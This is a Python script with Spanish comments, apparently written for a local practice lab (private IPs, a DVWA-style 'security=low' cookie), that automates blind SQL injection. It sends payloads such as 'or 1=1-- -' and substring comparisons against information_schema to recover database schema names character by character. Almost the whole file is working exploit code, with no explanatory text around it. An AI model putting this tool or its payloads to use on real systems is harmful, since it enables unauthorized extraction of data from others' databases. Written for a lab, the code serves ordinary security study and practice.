import requests

a = "http://192.168.0.101/sqli/example1.php?name=root' or substring((select schema_name from information_schema.schemata limit 0,1),1,1)='m'-- -"
b = "http://192.168.0.101/sqli/example1.php?name=' or 1 = 1-- -"


# Busca en la base de datos a partir de una inyeccion correcta
class SQLInjector:
    # region Constantes
    __entrada: str = "http://192.168.0.101/sqli/example1.php?name=root"
    __caracteres: str = 'abcdefghijklmnñopqrstuvwxyz0123456789_$,'
    __colaLinea: str = "'or 1=1-- -"
    __colaLineaError: str = "'and 1=0-- -"
    __cola: str = "'-- -"
    __parametroDivisor: str = "PARAM"
    __tochoComparador1: str = "' or substring((select schema_name from information_schema.schemata limit "
    __tochoComparador2: str = ",1),1,"
    __tochoComparador3: str = ")='"
    # endregion
    # region Variables modificables
    __iniciado: bool = False
    __resultadoPositivo: bytes
    # endregion

    def __init__(self, url: str):
        # self.__entrada = url
        self.__resultadoPositivo = requests.get(url=self.__entrada).content
        self.__iniciado = True

    def __buscarBasesDeDatos(self, fila: int, string: str):
        lineatemporal = self.__entrada + self.__tochoComparador1 + str(fila) + \
                        self.__tochoComparador2 + str(string.__len__() + 1) + \
                        self.__tochoComparador3 + string
        lista: list = []
        for caracter in self.__caracteres:
            urldetrabajo = lineatemporal + caracter + self.__cola
            # print(urldetrabajo)
            result = requests.get(url=urldetrabajo)
            if result.content != self.__resultadoPositivo:
                lista.append(caracter)
        if lista.__len__() > 0:
            string = self.__buscarBasesDeDatos(fila, string + lista[0])
        return string

    # Si todo se ha realizado con exito esto devolvera True
    def getIniciado(self):
        return self.__iniciado

    def buscarBlind(self):
        resultado: list = []
        if self.__iniciado is True:
            retorno: str = ""
            posicion: int = 0
            while retorno.__len__() > 0 or posicion == 0:
                retorno = self.__buscarBasesDeDatos(posicion, "")
                posicion += 1
                resultado.append(retorno)
        return resultado


s = SQLInjector("")
print(s.buscarBlind())
"""
for value in urldividida:
    if value .__len__() > 0:
        print(value)
    else:
        print("Contenido vacio")


urlBuena = "http://192.168.0.101/sqli/example1.php?name=root'and 1=1-- -"
"""
"""
for i in caracteres:
    print(i)
"""
"""
s = requests.Session()
s.cookies.set("PHPSESSID", "vesf85lptvdtv2hhmfsi6sluc3")
s.cookies.set("security", "low")
print(s.cookies)

r = s.get(url="http://192.168.0.100/vulnerabilities/sqli_blind/?id=1&Submit=Submit#")
print(r)
print(r.content)
print("")
"""
